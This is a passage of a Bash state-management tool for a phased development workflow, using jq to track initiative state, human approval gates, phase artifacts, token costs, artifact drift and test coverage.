    srd_version: "0.0.0",
    estimated_size: "Unknown",
    initiative_branch: $b,
    product_name: $prod,
    initiative_description: $desc,
    phase_durations: {},
    test_frameworks_detected: {},
    coverage_by_layer: {},
    coverage_by_epic: {},
    code_audit_converged: false,
    code_audit_gate_approved_at: "",
    code_audit_gate_approver: "",
    code_audit_gate_enforcement: "",
    code_audit_gate_ledger: "",
    compliance_gate_approved: false,
    last_decision: "",
    audit_rounds: {},
    partial_verdict_map: {},
    mode: $mode,
    lifecycle_mode: "standard",
    compliance_enabled: $ce,
    implementation_mode: $impl,
    skipped_phases: $skipped,
    supersedes: "",
    forked_from: "",
    parent_prefix: "",
    related_prefixes: [],
    last_updated: $t
  }'
}

_cmd_init_body() {
  local f="$1" prefix="$2" branch="$3" product="$4" description="$5" mode="$6" impl_mode="$7" compliance="$8" seeded_skipped="$9"
  if [[ -f "$f" ]]; then
    echo "edm-state: state file already exists at $f" >&2
    return 10
  fi
  write_atomic "$f" _cmd_init_render "$prefix" "$branch" "$product" "$description" "$mode" "$impl_mode" "$compliance" "$seeded_skipped"
}

cmd_init() {
  [[ $# -eq 1 ]] || die "usage: edm-state init <PREFIX>"
  require_jq
  local prefix="$1"
  local f lockbase
  f="$(state_file_for "$prefix")"
  lockbase="${f%.json}"
  mkdir -p "$(dirname "$f")"
  local branch product description
  branch="$(git rev-parse --abbrev-ref HEAD 2>/dev/null || echo '')"
  # Accept product/description from env so edm-init --product/--description can pre-seed them.
  product="${EDM_PRODUCT:-}"
  description="${EDM_DESCRIPTION:-}"
  # Seed mode-family fields from install-time userConfig defaults when edm-init exported them
  # (CA-010 / EDMV2-102 middle tier). A bare `edm-state init` (no env) keeps the built-in defaults.
  # Validate defensively so a stray env value can't write an invalid enum into fresh state.
  local mode="${EDM_MODE:-standard}"
  local compliance="${EDM_COMPLIANCE_ENABLED:-false}"
  local impl_mode="${EDM_IMPLEMENTATION_MODE:-standard}"
  # Word-membership test against the single-source MODE_ENUM_LIST (EDMV3-T07 AC5) --
  # avoids re-declaring the mode enum as a second case-literal list that would drift
  # from terminal_phase_for_mode()'s own enum.
  case " $MODE_ENUM_LIST " in *" $mode "*) ;; *) mode="standard" ;; esac
  case "$impl_mode" in standard|tdd) ;; *) impl_mode="standard" ;; esac
  case "$compliance" in true|false) ;; *) compliance="false" ;; esac
  # Seed skipped_phases from the mode's phase graph (EDMV3-T07 AC4) so a fresh
  # mini-srd or prototype initiative starts with its phase-skip exemptions already
  # recorded, rather than empty.
  local seeded_skipped
  seeded_skipped="$(default_skipped_phases_json_for_mode "$mode")"
  local init_ec=0
  with_state_lock "$lockbase" _cmd_init_body "$f" "$prefix" "$branch" "$product" "$description" "$mode" "$impl_mode" "$compliance" "$seeded_skipped" || init_ec=$?
  if [[ $init_ec -eq 10 ]]; then
    return 0
  elif [[ $init_ec -ne 0 ]]; then
    return $init_ec
  fi
  echo "initialized $f"
}

cmd_list() {
  # --paths: read-only, no lock, no jq dependency -- print each resolved initiative directory
  # (one per line), covering both flat and product-scoped layouts and excluding .archived/
  # (list_state_files with no arg already excludes it). Consumed by `edm-lint-artifacts --all`
  # so there is exactly one implementation of layout resolution (EDMV3-111).
  if [[ "${1:-}" == "--paths" ]]; then
    [[ -d "$SRD_ROOT" ]] || return 0
    local state
    while IFS= read -r state; do
      [[ -f "$state" ]] || continue
      echo "${state%/.edm-state.json}"
    done < <(list_state_files)
    return 0
  fi

  [[ -d "$SRD_ROOT" ]] || { echo "no SRD/ directory yet"; return 0; }
  require_jq
  local found=0
  # Collect state files from both flat (SRD/{PREFIX}/) and product-scoped
  # (SRD/{PRODUCT}/{PREFIX}__*/) layouts; de-duplicate by canonical path.
  local state
  # Enumerate both layouts via the single shared helper (CA-011); it already dedups by path.
  while IFS= read -r state; do
    [[ -f "$state" ]] || continue
    found=1
    local prefix phase gates last product description
    prefix="$(jq -r '.prefix // "unknown"' "$state" 2>/dev/null || echo unknown)"
    phase="$(jq -r '(.current_phase // 0) | if type == "number" then floor else 0 end' "$state" 2>/dev/null || echo 0)"
    gates="$(jq -r '.gates_approved | length' "$state" 2>/dev/null || echo 0)"
    last="$(jq -r '.last_updated // "unknown"' "$state" 2>/dev/null || echo unknown)"
    product="$(jq -r '.product_name // ""' "$state" 2>/dev/null || true)"
    description="$(jq -r '.initiative_description // ""' "$state" 2>/dev/null || true)"
    if [[ -n "$product" || -n "$description" ]]; then
      printf "  %-12s  phase=%d  gates_approved=%d  last_updated=%s  product=%s  description=%s\n" \
        "$prefix" "$phase" "$gates" "$last" "${product:-(none)}" "${description:-(none)}"
    else
      printf "  %-12s  phase=%d  gates_approved=%d  last_updated=%s\n" "$prefix" "$phase" "$gates" "$last"
    fi
  done < <(list_state_files)
  [[ $found -eq 1 ]] || echo "  (no in-progress initiatives)"
}

cmd_approve_gate() {
  [[ $# -eq 2 ]] || die "usage: edm-state approve-gate <PREFIX> <gate-num>|3.5|code-audit"
  require_jq
  local prefix="$1" gate="$2"
  local approver="${USER:-unknown}"
  # Gate 3.5 (compliance review) is stored as a dedicated boolean field rather than
  # appended to gates_approved (which expects integers) -- avoids overloading numeric gate IDs.
  # `code-audit` below (EDMV3-T08) is the second user of this dedicated-boolean pattern: a
  # fourth gate field added later should inherit the same shape by adding one token here.
  # approved_at/approver/enforcement are sibling scalar keys alongside the boolean, the
  # identical shape the code-audit branch below uses (EDMV3-T06 AC10) -- converting the
  # boolean itself into an object is a failing condition metrics-report and HANDOFF both
  # depend on it staying `boolean`.
  if [[ "$gate" == "3.5" ]]; then
    rmw_state "$prefix" '
      .compliance_gate_approved = true
      | .compliance_gate_approved_at = $t
      | .compliance_gate_approver = $a
      | .compliance_gate_enforcement = $e
      | .last_updated = $t
    ' --arg t "$(now_utc)" --arg a "$approver" --arg e "$(check_permission_rules)"
    echo "approved compliance gate 3.5 for $prefix at $(now_utc)"
    write_handoff_internal "$prefix"
    return 0
  fi
  # Gate `code-audit` (EDMV3-11/108): code_audit_converged is the dedicated boolean;
  # approved_at/approver/enforcement/ledger are sibling metadata scalars recorded alongside
  # it (gates_approved holds integers only -- a non-integer gate id would overload
  # cmd_gate_check's `select(.gate == $g)` comparison).
  if [[ "$gate" == "code-audit" ]]; then
    local mode lifecycle_mode state_json audit_required
    state_json="$(read_state "$prefix")"
    mode="$(echo "$state_json" | jq -r '.mode // "null"')"
    lifecycle_mode="$(echo "$state_json" | jq -r '.lifecycle_mode // "standard"')"
    audit_required="$(audit_required_for_mode_or_legacy "$mode")"

    if [[ "$audit_required" == "false" ]]; then
      # AC4 (mode exemption): this mode's phase graph has no code-audit round, so the gate
      # is not presented -- record the exemption reason rather than an approval. No
      # approved_at/approver is written and code_audit_converged is left untouched.
      rmw_state "$prefix" '.code_audit_gate_enforcement = "CONVERGENCE_NOT_REQUIRED" | .last_updated = $t' \
        --arg t "$(now_utc)"
      echo "code-audit gate not required for $prefix (${mode} mode) -- recorded CONVERGENCE_NOT_REQUIRED"
      write_handoff_internal "$prefix"
      return 0
    fi

    # CA-183: fast-track/fix-pack is a convergence_exempt() lifecycle (audit_converged and
    # archive both treat it as "no audit round to converge"), but approve-gate deliberately
    # stays refused rather than exempt -- a human approving a numeric gate should never see a
    # silent auto-pass just because the lifecycle would let archive skip the check later. This
    # must be checked BEFORE the schema-gated block below delegates to cmd_audit_converged,
    # because that helper calls the SHARED convergence_exempt() and would otherwise exit 0 here
    # too, silently approving the gate under fast-track exactly as CA-182 did under a stale
    # schema_version -- the same bypass shape, a different gap.
    case "$lifecycle_mode" in
      fast-track|fix-pack)
        die "code-audit gate refused for ${prefix}: lifecycle_mode=${lifecycle_mode} is convergence_exempt for archive/audit-converged, but approve-gate never exempts a lifecycle_mode -- run a real code-audit round and converge it, or use skip-phase if no implementation code-audit applies"
        ;;
    esac

    # EDMV3-T28 AC12/AC9: re-run the convergence pre-check here too (not just trust a prior
    # standalone `audit-converged` call), closing the time-of-check-to-time-of-use window
    # between that call and this approval (SRD Section 5.3). Evaluates the shared
    # BLOCKING_FILTER predicate via cmd_audit_converged.
    #
    # G1/CA-182 (round 3): the precheck is now ALWAYS run -- only its exit-3 (no JSONL ledger)
    # arm degrades, and only for a pre-wave-B initiative (EDMV3-T28 AC7's caller-side
    # degradation). Previously the entire precheck ran only when ag_schema_class2 == "2";
    # `_cmd_init_render` still writes the literal `schema_version: 1` and nothing auto-migrates
    # or prompts migrate-schema, so for EVERY initiative created by the current plugin version
    # the precheck was environmentally unreachable and the gate was unconditionally approvable
    # regardless of open findings.
    local ag_schema_version ag_schema_class2
    ag_schema_version="$(echo "$state_json" | jq -r '.schema_version // empty')"
    ag_schema_class2="$(schema_at_least "$ag_schema_version" 2)"
    local conv_out conv_ec=0
    conv_out="$(cmd_audit_converged "$prefix" 2>&1)" || conv_ec=$?
    if [[ $conv_ec -eq 3 && "$ag_schema_class2" != "2" ]]; then
      record_degraded_check "$prefix" "approve-gate:code-audit-ledger-shape" \
        "schema_version ${ag_schema_version:-absent} < 2 and no findings-ledger.jsonl"
      echo "edm-state approve-gate: [warn] no JSONL findings ledger and schema_version ${ag_schema_version:-absent} < 2 -- convergence not computable" >&2
    else
      [[ $conv_ec -eq 0 ]] || die "code-audit gate refused for ${prefix}: ${conv_out}"
    fi

    # Wave-A interim (AC3) shape retained: records the approval with `enforcement` and the
    # real ledger path (or "absent" pre-wave-B) rather than a hardcoded literal.
    # check_permission_rules() performs real permission-rule introspection (EDMV3-T06).
    local ledger_field="absent"
    [[ -f "$(initiative_dir_for "$prefix")/code-audit/findings-ledger.jsonl" ]] \
      && ledger_field="$(initiative_dir_for "$prefix")/code-audit/findings-ledger.jsonl"
    rmw_state "$prefix" '
      .code_audit_converged = true
      | .code_audit_gate_approved_at = $t
      | .code_audit_gate_approver = $a
      | .code_audit_gate_enforcement = $e
      | .code_audit_gate_ledger = $l
      | .last_updated = $t
    ' --arg t "$(now_utc)" --arg a "$approver" --arg e "$(check_permission_rules)" --arg l "$ledger_field"
    echo "approved code-audit gate for $prefix at $(now_utc)"
    write_handoff_internal "$prefix"
    return 0
  fi
  [[ "$gate" =~ ^[0-9]+$ ]] || die "approve-gate: gate-num must be numeric; got: $gate"
  # `enforcement` on every gates_approved entry (EDMV3-T06 AC8/AC9) -- the numeric HITL
  # gates get the same honesty tag the dedicated-boolean gates above already carry.
  rmw_state "$prefix" \
    '.gates_approved += [{gate: ($g|tonumber), approved_at: $t, approver: $a, enforcement: $e}] | .last_updated = $t' \
    --arg g "$gate" --arg t "$(now_utc)" --arg a "$approver" --arg e "$(check_permission_rules)"
  echo "approved gate $gate for $prefix at $(now_utc)"
  write_handoff_internal "$prefix"
}

cmd_phase_start() {
  [[ $# -eq 2 ]] || die "usage: edm-state phase-start <PREFIX> <phase-num>"
  require_jq
  local prefix="$1" phase="$2"
  # CA-157: phase reaches an arithmetic context in phase_start_prerequisite_gate below --
  # validate here at the entry point, same shape as cmd_skip_phase's phase_num check.
  [[ "$phase" =~ ^[1-6]$ ]] || die "phase-start: phase-num must be 1-6; got: $phase"

  # Kernel gate refusal (EDMV3-T13 AC1): the deterministic enforcement point -- every phase
  # skill already calls phase-start, so this applies to every entry path (including the
  # Skill-tool path, which bypasses the UserPromptExpansion hooks). Runs before any timestamp
  # is written so a refusal mutates nothing (AC2).
  # requires schema_version >= 1 (EDMV3-T13 AC7 remediation): the real legacy signal is
  # absent schema_version, not a missing mode field -- a genuine pre-EDMV3 initiative (e.g.
  # SRD/.archived/EDMV2) already carries mode="standard" and would otherwise get full
  # enforcement instead of warn-and-proceed. mode == "null" is kept as a secondary guard for
  # a hand-edited state file missing mode entirely (belt-and-suspenders, not the primary
  # signal). Uses the shared schema_at_least() three-valued helper (EDMV3-T14) rather than
  # re-deriving the comparison.
  local state mode schema_version_ps
  state="$(read_state "$prefix")"
  mode="$(echo "$state" | jq -r '.mode // "null"')"
  schema_version_ps="$(echo "$state" | jq -r '.schema_version // empty')"
  if [[ "$(schema_at_least "$schema_version_ps" 1)" == "0" || "$mode" == "null" ]]; then
    # C-4 (AC7): a legacy state predating schema_version warns and proceeds rather than
    # hard-failing -- there is no mode-derived prerequisite gate to check against.
    echo "edm-state phase-start: [warn] legacy initiative (no schema_version) -- skipping kernel gate enforcement" >&2
    # EDMV3-T62 AC5: persist the skip to state, not just this transient console line.
    record_degraded_check "$prefix" "phase-start:kernel-gate-enforcement" "no schema_version"
  else
    # phase_start_prerequisite_gate + required_gates_for_mode are the same derivation
    # cmd_gate_check's AC5 mode filter and cmd_archive's convergence waiver use -- not a
    # second one (EDMV3-T07).
    local prereq_gate
    prereq_gate="$(phase_start_prerequisite_gate "$phase")"
    if [[ "$prereq_gate" != "none" ]]; then
      local lifecycle_mode skipped_phases_str required_gates_list
      lifecycle_mode="$(echo "$state" | jq -r '.lifecycle_mode // "standard"')"
      skipped_phases_str="$(echo "$state" | jq -r '[(.skipped_phases // [])[].phase] | join(" ")')"
      required_gates_list="$(required_gates_for_mode "$mode" "$lifecycle_mode" "$skipped_phases_str")"
      if printf '%s\n' "$required_gates_list" | grep -qx "$prereq_gate"; then
        local approved
        approved="$(echo "$state" | jq -r --argjson g "$prereq_gate" '
          (.gates_approved // []) | map(select(.gate == $g)) | length
        ' 2>/dev/null || echo 0)"
        if [[ "$approved" -eq 0 ]]; then
          echo "edm-state phase-start: Gate ${prereq_gate} has not been approved for ${prefix}; phase ${phase} cannot start." >&2
          echo "Run: edm-state approve-gate ${prefix} ${prereq_gate}" >&2
          return 1
        fi
      fi
    fi
  fi

  local key="${phase}_phase"
  rmw_state "$prefix" \
    '.current_phase = ($p|tonumber) | .phase_durations[$k] = ((.phase_durations[$k] // {}) + {started_at: $t}) | .last_updated = $t' \
    --arg k "$key" --arg p "$phase" --arg t "$(now_utc)"
  write_handoff_internal "$prefix"
}

cmd_phase_complete() {
  [[ $# -eq 2 ]] || die "usage: edm-state phase-complete <PREFIX> <phase-num>"
  require_jq
  local prefix="$1" phase="$2"
  # CA-157: same arithmetic-context injection guard as cmd_phase_start.
  [[ "$phase" =~ ^[1-6]$ ]] || die "phase-complete: phase-num must be 1-6; got: $phase"
  local key="${phase}_phase"

  # Read started_at for token computation (read-only, no lock needed)
  local state_file started_at
  state_file="$(state_file_for "$prefix")"
  [[ -f "$state_file" ]] || die "no state file for $prefix"
  started_at="$(jq -r --arg k "$key" '.phase_durations[$k].started_at // empty' "$state_file")"

  # ---- Artifact verification (EDMV3-T11) -- runs before any timing/token/cost data is
  # computed or recorded, so a refusal mutates nothing (AC2). No override flag of any kind
  # exists (AC7); the only exemption is a phase already recorded in skipped_phases (AC5), an
  # auditable state entry rather than a command-line flag.
  # requires schema_version >= 1 (EDMV3-16, EDMV3-T09 AC10): absent schema_version is the
  # legacy signal (C-4, AC8) -- this whole block warns and proceeds rather than hard-failing.
  # Uses the shared schema_at_least() three-valued helper (EDMV3-T14) rather than re-deriving
  # the absent/below/at-or-above comparison here.
  local pc_state pc_schema_version pc_class1
  pc_state="$(cat "$state_file")"
  pc_schema_version="$(echo "$pc_state" | jq -r '.schema_version // empty')"
  pc_class1="$(schema_at_least "$pc_schema_version" 1)"

  if [[ "$pc_class1" == "0" ]]; then
    echo "edm-state phase-complete: [warn] legacy initiative (no schema_version) -- skipping artifact verification for phase ${phase}" >&2
    # EDMV3-T62 AC5: persist the skip to state, not just this transient console line.
    record_degraded_check "$prefix" "phase-complete:artifact-verification" "no schema_version (phase ${phase})"
  else
    local pc_skipped_str pc_phase_skipped=0
    pc_skipped_str="$(echo "$pc_state" | jq -r '[(.skipped_phases // [])[].phase] | join(" ")')"
    case " $pc_skipped_str " in
      *" $phase "*) pc_phase_skipped=1 ;;
    esac

    if [[ $pc_phase_skipped -eq 0 ]]; then
      local pc_dir
      pc_dir="$(initiative_dir_for "$prefix")"
      # The three literal filenames below (planning.md, audit-srd.md, and the qc/ paths) are
      # fixed by the artifact layout documented in CLAUDE.md and are NOT user-configurable,
      # unlike ${SRD_FILENAME} and ${TICKET_PACK_DIRNAME} which the userConfig can rename
      # (AC10) -- there is no corresponding env var for these three on purpose.
      # EDMV3-T11 AC1 remediation (shard-1 QC): all six artifact-presence checks below route
      # through present_or_absent's "nonempty" variant (defined above, `-s` instead of `-f`)
      # rather than a bare `[[ -s ]]` -- the extended idiom this ticket added is the single
      # presence check every phase-complete arm uses, not a sixth one defined and left unused.
      case "$phase" in
        1)
          [[ "$(present_or_absent "${pc_dir}/planning.md" nonempty)" == "[present]" ]] \
            || die "phase-complete: phase 1 artifact missing or empty: ${pc_dir}/planning.md"
          ;;
        2)
          [[ "$(present_or_absent "${pc_dir}/${SRD_FILENAME}" nonempty)" == "[present]" ]] \
            || die "phase-complete: phase 2 artifact missing or empty: ${pc_dir}/${SRD_FILENAME}"
          ;;
        3)
          [[ "$(present_or_absent "${pc_dir}/audit-srd.md" nonempty)" == "[present]" ]] \
            || die "phase-complete: phase 3 artifact missing or empty: ${pc_dir}/audit-srd.md"
          ;;
        4)
          [[ "$(present_or_absent "${pc_dir}/${TICKET_PACK_DIRNAME}/README.md" nonempty)" == "[present]" ]] \
            || die "phase-complete: phase 4 artifact missing or empty: ${pc_dir}/${TICKET_PACK_DIRNAME}/README.md"
          ;;
        5)
          [[ "$(present_or_absent "${pc_dir}/${TICKET_PACK_DIRNAME}/audit.md" nonempty)" == "[present]" ]] \
            || die "phase-complete: phase 5 artifact missing or empty: ${pc_dir}/${TICKET_PACK_DIRNAME}/audit.md"
          ;;
        6)
          # AC3: accept qc/qc-summary.md OR any qc/qc-shard-*.md (sharded QC merge).
          if [[ "$(present_or_absent "${pc_dir}/qc/qc-summary.md" nonempty)" == "[absent]" ]]; then
            local pc_shard pc_shard_found=0
            for pc_shard in "${pc_dir}"/qc/qc-shard-*.md; do
              [[ "$(present_or_absent "$pc_shard" nonempty)" == "[present]" ]] && pc_shard_found=1 && break
            done
            [[ $pc_shard_found -eq 1 ]] \
              || die "phase-complete: phase 6 artifact missing or empty: ${pc_dir}/qc/qc-summary.md (or any ${pc_dir}/qc/qc-shard-*.md)"
          fi
          ;;
      esac
    fi

    # AC4/AC5: phase 6's open-PARTIAL check is never exempted by skipped_phases -- a skipped
    # phase 6 still refuses on an open PARTIAL. requires schema_version >= 2 (EDMV3-T09
    # AC10); below that it warns and proceeds rather than hard-failing. This is the middle
    # class of the three-valued model (EDMV3-T14 AC6): a schema_version of 1 is present and
    # satisfies every wave-A (>=1) check above in full, but still warn-and-proceeds through
    # this specific wave-B (>=2) check -- schema_at_least() returns 1 for exactly this case.
    if [[ "$phase" == "6" ]]; then
      if [[ "$(schema_at_least "$pc_schema_version" 2)" == "2" ]]; then
        local pc_open_partials
        pc_open_partials="$(echo "$pc_state" | jq -r '
          [(.partial_verdict_map // {}) | to_entries[] | select(.value.verdict == "PARTIAL")] | length
        ' 2>/dev/null || echo 0)"
        [[ "$pc_open_partials" -eq 0 ]] \
          || die "phase-complete: phase 6 has ${pc_open_partials} unresolved PARTIAL verdict(s); run /edm:verify-runtime ${prefix} before completing phase 6"
      else
        echo "edm-state phase-complete: [warn] schema_version ${pc_schema_version} < 2 -- skipping open-PARTIAL check for phase 6" >&2
      fi
    fi
  fi

  # Compute tokens + cost outside the lock (read-only)
  local input=0 output=0 cache_read=0 cw5m=0 cw1h=0 model="unknown" cost="0.0000" attribution_mode="whole-directory" unparseable_lines=0
  if [[ -n "$started_at" ]]; then
    local tokens
    tokens="$(get_session_tokens_since "$started_at")"
    _unpack_token_fields "$tokens"
    input="$_EDM_TOKENS_INPUT"; output="$_EDM_TOKENS_OUTPUT"; cache_read="$_EDM_TOKENS_CACHE_READ"
    cw5m="$_EDM_TOKENS_CACHE_WRITE_5M"; cw1h="$_EDM_TOKENS_CACHE_WRITE_1H"; model="$_EDM_TOKENS_MODEL"
    attribution_mode="$_EDM_TOKENS_ATTRIBUTION_MODE"; unparseable_lines="$_EDM_TOKENS_UNPARSEABLE_LINES"
    cost="$(compute_cost_usd "$model" "$input" "$output" "$cache_read" "$cw5m" "$cw1h")"
  fi

  # Compute human baseline outside the lock (read-only)
  local size human_cost
  size="$(jq -r '.estimated_size // "Unknown"' "$state_file")"
  human_cost="$(human_cost_for_phase "$phase" "$size")"

  local now_ts
  now_ts="$(now_utc)"

  # Atomic RMW under lock
  rmw_state "$prefix" '
    .phase_durations[$k] = (
      (.phase_durations[$k] // {})
      | . + {completed_at: $t}
      | . + {duration_seconds: (
          if .started_at then ((($t | fromdateiso8601) - (.started_at | fromdateiso8601))) else 0 end
        )}
      | . + {tokens: {input: ($i|tonumber), output: ($o|tonumber), cache_read: ($cr|tonumber), cache_write_5m: ($c5|tonumber), cache_write_1h: ($c1|tonumber)}}
      | . + {model_used: $model}
      | . + {estimated_cost_usd: ($cost | tonumber)}
      | . + {human_baseline_usd: ($human_cost | tonumber)}
      | . + {attribution_mode: $am}
      | . + {unparseable_lines: ($ul | tonumber)}
    )
    | .last_updated = $t
  ' --arg k "$key" --arg t "$now_ts" \
    --arg i "$input" --arg o "$output" --arg cr "$cache_read" --arg c5 "$cw5m" --arg c1 "$cw1h" \
    --arg model "$model" --arg cost "$cost" --arg human_cost "$human_cost" --arg am "$attribution_mode" \
    --arg ul "$unparseable_lines"

  # Record artifact hashes for phases that produce or revise gate-critical files.
  # Drift is detected in checkpoint-if-active by comparing these stored hashes to
  # what's currently on disk.
  local _dir
  _dir="$(initiative_dir_for "$prefix")"
  case "$phase" in
    2|3)
      local srd_path="${_dir}/${SRD_FILENAME}"
      [[ -f "$srd_path" ]] && record_artifact_hash "$prefix" "srd" "$srd_path" ;;
    4|5)
      local tickets_path="${_dir}/${TICKET_PACK_DIRNAME}/README.md"
      [[ -f "$tickets_path" ]] && record_artifact_hash "$prefix" "tickets" "$tickets_path" ;;
  esac

  write_handoff_internal "$prefix"
}

cmd_checkpoint() {
  # Called by Stop/PreCompact hooks. Touches last_updated and checks whether any
  # gate-critical artifacts (SRD, ticket pack) have changed since their last
  # recorded hash. Warnings are printed to stdout so Claude surfaces them.
  # T53: write_handoff_internal is called at the end of each iteration, so the
  # PreCompact hook chain (checkpoint-if-active -> write_handoff_internal) already
  # refreshes the Resume Point section on every compaction -- no separate hook needed.
  [[ -d "$SRD_ROOT" ]] || return 0
  require_jq
  while IFS= read -r state; do
    [[ -f "$state" ]] || { echo "edm-state checkpoint: [warn] skipping missing state file at ${state}" >&2; continue; }
    if ! jq -e '.' "$state" >/dev/null 2>&1; then
      echo "edm-state checkpoint: [warn] skipping unreadable or invalid state file at ${state}" >&2
      continue
    fi
    local prefix
    prefix="$(jq -r '.prefix // empty' "$state" 2>/dev/null || true)"
    [[ -n "$prefix" ]] || { echo "edm-state checkpoint: [warn] skipping state file with no prefix at ${state}" >&2; continue; }

    # CA-026: resolve the prefix back to its canonical path and refuse to mutate anything for
    # this entry unless it matches the file actually being iterated -- a state file whose
    # .prefix field disagrees with its own directory would otherwise cause rmw_state (via
    # state_file_for) to create a stray SRD/<other-prefix>/ directory during the sweep.
    local resolved_state
    resolved_state="$(state_file_for "$prefix" 2>/dev/null || true)"
    if [[ "$resolved_state" != "$state" ]]; then
      echo "edm-state checkpoint: [warn] skipping ${state}: prefix '${prefix}' resolves to ${resolved_state:-<unresolved>}, not this file -- fix the .prefix field or the directory placement" >&2
      continue
    fi

    # CA-026: isolate the rest of this iteration's body in a subshell so a failure here (a jq
    # crash inside rmw_state, a die from write_handoff_internal) skips only THIS initiative
    # instead of aborting the sweep for every initiative still queued after it in iteration
    # order -- the hook call sites that invoke checkpointing all end in `|| true`, so an aborted
    # sweep previously failed every later initiative silently, with no diagnostic at all.
    (
      local current hashes drift_found current_hash gate_status
      # G3: route through locked RMW -- no more hand-rolled cat/jq/printf
      rmw_state "$prefix" '.last_updated = $t' --arg t "$(now_utc)"

      # Drift detection (read-only)
      current="$(cat "$state")"   # re-read after the rmw
      hashes="$(echo "$current" | jq -r '.artifact_hashes // {} | to_entries[] | "\(.key) \(.value.hash) \(.value.path) \(.value.recorded_at)"' 2>/dev/null || true)"
      drift_found=0
      while IFS=' ' read -r artifact_name stored_hash file_path recorded_at; do
        [[ -n "$artifact_name" ]] || continue
        current_hash="$(artifact_hash "$file_path")"
        if [[ "$current_hash" != "$stored_hash" && "$current_hash" != "absent" && "$current_hash" != "unhashable" ]]; then
          if [[ $drift_found -eq 0 ]]; then
            echo ""
            echo "(!) EDM drift detected - ${prefix}:"
            drift_found=1
          fi
          case "$artifact_name" in
            srd)
              gate_status="$(echo "$current" | jq -r '
                (.gates_approved // []) | map(select(.gate == 2)) |
                if length > 0 then "Gate 2 was approved at \(.[0].approved_at)" else "Gate 2 not yet approved" end
              ' 2>/dev/null || echo "unknown gate status")"
              echo "  ${SRD_FILENAME} modified since last recorded at phase-complete (${recorded_at})."
              echo "  ${gate_status}."
              echo "  -> Re-run /edm:audit-srd ${prefix} and re-approve Gate 2 before creating tickets."
              ;;
            tickets)
              gate_status="$(echo "$current" | jq -r '
                (.gates_approved // []) | map(select(.gate == 3)) |
                if length > 0 then "Gate 3 was approved at \(.[0].approved_at)" else "Gate 3 not yet approved" end
              ' 2>/dev/null || echo "unknown gate status")"
              echo "  Ticket pack README modified since last recorded at phase-complete (${recorded_at})."
              echo "  ${gate_status}."
              echo "  -> Re-run /edm:audit-tickets ${prefix} and re-approve Gate 3 before implementation."
              ;;
            *)
              echo "  ${artifact_name} (${file_path}) modified since last recorded at ${recorded_at}."
              ;;
          esac
        fi
      done <<< "$hashes"
      [[ $drift_found -eq 0 ]] || echo ""
      write_handoff_internal "$prefix"
    ) || echo "edm-state checkpoint: [warn] skipping ${prefix}: exit $?" >&2
  done < <(list_state_files)
}

cmd_record_test_coverage() {
  [[ $# -eq 3 ]] || [[ $# -eq 4 ]] \
    || die "usage: edm-state record-test-coverage <PREFIX> <layer> <pct> [<epic>]"
  require_jq
  local prefix="$1" layer="$2" pct="$3" epic="${4:-}"
  [[ "$pct" =~ ^-?[0-9]+(\.[0-9]+)?$ ]] \
    || die "record-test-coverage: pct must be numeric; got: $pct"
  if [[ -n "$epic" ]]; then
    rmw_state "$prefix" \
      '.coverage_by_epic[$e][$l] = {pct: ($p|tonumber), measured_at: $t} | .last_updated = $t' \
      --arg l "$layer" --arg p "$pct" --arg t "$(now_utc)" --arg e "$epic"
    echo "recorded coverage: epic=$epic layer=$layer = ${pct}% for $prefix"
  else
    rmw_state "$prefix" \
      '.coverage_by_layer[$l] = {pct: ($p|tonumber), measured_at: $t} | .last_updated = $t' \
      --arg l "$layer" --arg p "$pct" --arg t "$(now_utc)"
    echo "recorded coverage: $layer = ${pct}% for $prefix"
  fi
}

cmd_record_tests_added() {
  [[ $# -eq 4 ]] || die "usage: edm-state record-tests-added <PREFIX> <phase> <layer> <count>"
  require_jq
  local prefix="$1" phase="$2" layer="$3" count="$4"
  [[ "$count" =~ ^[0-9]+$ ]] \
    || die "record-tests-added: count must be a non-negative integer; got: $count"
  local key="${phase}_phase"
  rmw_state "$prefix" '
    .phase_durations[$k] = ((.phase_durations[$k] // {})
      | .tests_by_layer[$l] = ((.tests_by_layer[$l] // 0) + ($c|tonumber))
      | .tests_added = ((.tests_by_layer | to_entries | map(.value) | add) // 0))
    | .last_updated = $t
  ' --arg k "$key" --arg l "$layer" --arg c "$count" --arg t "$(now_utc)"
  echo "recorded: +${count} ${layer} tests in phase ${phase} for $prefix"
}

cmd_get_coverage() {
  [[ $# -eq 1 ]] || die "usage: edm-state get-coverage <PREFIX>"
  require_jq
  local prefix="$1"
  local state
  state="$(state_file_for "$prefix")"
  [[ -f "$state" ]] || die "no state for $prefix"
  # CA-136: a state file that exists but is not valid JSON previously aborted this command with
  # no message at all under set -euo pipefail (jq's own diagnostic was already discarded by the
  # 2>/dev/null redirects on every renderer below) -- fail loudly here instead, once, up front.
  jq -e . "$state" >/dev/null 2>&1 || die "get-coverage: unparseable state file at $state"
  echo "# Test Coverage - $prefix"
  echo
  # Whole-initiative coverage (single-stack)
  jq -r "${COVERAGE_LAYER_ROW_JQ_DEF}"'
    (.coverage_by_layer // {}) | to_entries |
    if length == 0 then empty
    else
      "## Whole-Initiative Coverage",
      "",
      "  Layer          Coverage   Measured At",
      "  ----------     --------   -----------",
      (.[] | coverage_layer_row),
      ""
    end
  ' "$state" 2>/dev/null || true
  # Per-epic coverage (multi-stack)
  jq -r '
    (.coverage_by_epic // {}) | to_entries |
    if length == 0 then empty
    else
      "## Per-Epic Coverage",
      "",
      "  Epic            Layer          Coverage  Measured At",
      "  ------          ----------     --------  -----------",
      (.[] | .key as $epic | .value | to_entries[] |
        "  \($epic | . + (" " * (15 - length | if . < 0 then 0 else . end)))  \(.key | . + (" " * (14 - length | if . < 0 then 0 else . end)))  \(.value.pct)%\(if .value.pct < 10 then "        " elif .value.pct < 100 then "       " else "      " end)  \(.value.measured_at // "?")"),
      ""
    end
  ' "$state" 2>/dev/null || true
  # Fallback message when neither is present
  jq -r '
    if ((.coverage_by_layer // {} | length) + (.coverage_by_epic // {} | length)) == 0
    then "  (no coverage recorded yet - run /edm:test first)"
    else empty
    end
  ' "$state" 2>/dev/null || echo "  (no coverage data)"
  jq -r '
    [.phase_durations | to_entries[] | {phase: .key, tests: .value.tests_added, by_layer: .value.tests_by_layer}] |
    map(select(.tests != null and .tests > 0)) |
    if length == 0 then empty
    else
      "# Tests Added by Phase",
      (.[] | "  \(.phase): \(.tests) total  \(.by_layer // {} | to_entries | map("\(.key)=\(.value)") | join(", "))")
    end
  ' "$state" 2>/dev/null || true
  return 0
}

cmd_srd_version() {
  [[ $# -eq 2 ]] || die "usage: edm-state srd-version <PREFIX> <version>"
  local prefix="$1" version="$2"
  require_jq
